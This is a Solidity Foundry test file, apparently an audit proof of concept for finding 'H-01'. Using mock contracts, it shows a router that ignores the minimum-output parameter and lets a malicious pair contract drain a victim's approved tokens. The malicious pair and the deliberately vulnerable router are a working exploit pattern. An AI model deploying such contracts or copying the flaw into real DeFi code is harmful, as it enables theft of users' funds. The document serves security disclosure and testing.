// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

// --- Self-contained PoC for H-01 ---

// 1. A minimal ERC20 interface needed for the test
interface IMiniERC20 {
    function balanceOf(address account) external view returns (uint256);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

// 2. A mock ERC20 token contract
contract MockERC20 is IMiniERC20 {
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;

    function mint(address to, uint256 amount) public {
        balanceOf[to] += amount;
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public override returns (bool) {
        uint256 currentAllowance = allowance[from][msg.sender];
        require(currentAllowance >= amount, "ERC20: insufficient allowance");

        allowance[from][msg.sender] = currentAllowance - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;

        return true;
    }
}

// 3. The malicious pair that will drain funds
contract MaliciousPair {
    IMiniERC20 public immutable token;

    constructor(address tokenAddress) {
        token = IMiniERC20(tokenAddress);
    }

    // The router will call this function. The pair then pulls the approved funds.
    function swap() external {
        uint256 approvedAmount = token.allowance(msg.sender, address(this));
        token.transferFrom(msg.sender, address(this), approvedAmount);
    }
}

// 4. A simplified version of the GTERouter with the vulnerability
contract VulnerableGTERouter {
    // This function mimics the vulnerable part of GTERouter.executeRoute()
    function executeRoute(
        address tokenIn,
        address pair,
        uint256 amountIn,
        uint256 /* minAmountOut */ // This parameter is ignored, which is the core of the vulnerability
    ) external {
        // 1. Router takes tokens from the user (victim)
        IMiniERC20(tokenIn).transferFrom(msg.sender, address(this), amountIn);

        // 2. Router approves the malicious pair to spend the tokens it just received
        IMiniERC20(tokenIn).approve(pair, amountIn);

        // 3. Router calls the malicious pair's swap function
        MaliciousPair(pair).swap();
    }
}

// 5. The main test contract
contract PocHighGTERouterLacksMinOutCheck is Test {
    VulnerableGTERouter internal router;
    MockERC20 internal usdc;
    address internal victim;
    MaliciousPair internal pair;

    function setUp() public {
        // Create the contracts needed for the test
        router = new VulnerableGTERouter();
        usdc = new MockERC20();
        victim = makeAddr("victim");

        // Create the malicious pair targeting our mock USDC
        pair = new MaliciousPair(address(usdc));

        // Give the victim 1000 USDC to start with
        usdc.mint(victim, 1000 * 1e6);

        // The victim approves the router to spend their USDC
        vm.startPrank(victim);
        usdc.approve(address(router), type(uint256).max);
        vm.stopPrank();
    }

    function test_PoC_SandwichAttackCausesDirectLoss() public {
        uint256 amountToSwap = 1000 * 1e6;

        uint256 victimBalanceBefore = usdc.balanceOf(victim);
        uint256 pairBalanceBefore = usdc.balanceOf(address(pair));

        console.log("--- Before Swap ---");
        console.log("Victim USDC Balance:", victimBalanceBefore);
        console.log("Malicious Pair USDC Balance:", pairBalanceBefore);

        // The victim initiates the swap via the vulnerable router.
        vm.startPrank(victim);
        router.executeRoute(address(usdc), address(pair), amountToSwap, 0);
        vm.stopPrank();

        uint256 victimBalanceAfter = usdc.balanceOf(victim);
        uint256 pairBalanceAfter = usdc.balanceOf(address(pair));

        console.log("--- After Swap ---");
        console.log("Victim USDC Balance:", victimBalanceAfter);
        console.log("Malicious Pair USDC Balance:", pairBalanceAfter);

        // --- Assertions ---
        assertEq(
            victimBalanceAfter,
            0,
            "Victim's USDC balance should be 0 after the attack"
        );
        assertEq(
            pairBalanceAfter,
            amountToSwap,
            "Malicious pair should have the victim's funds"
        );
    }
}
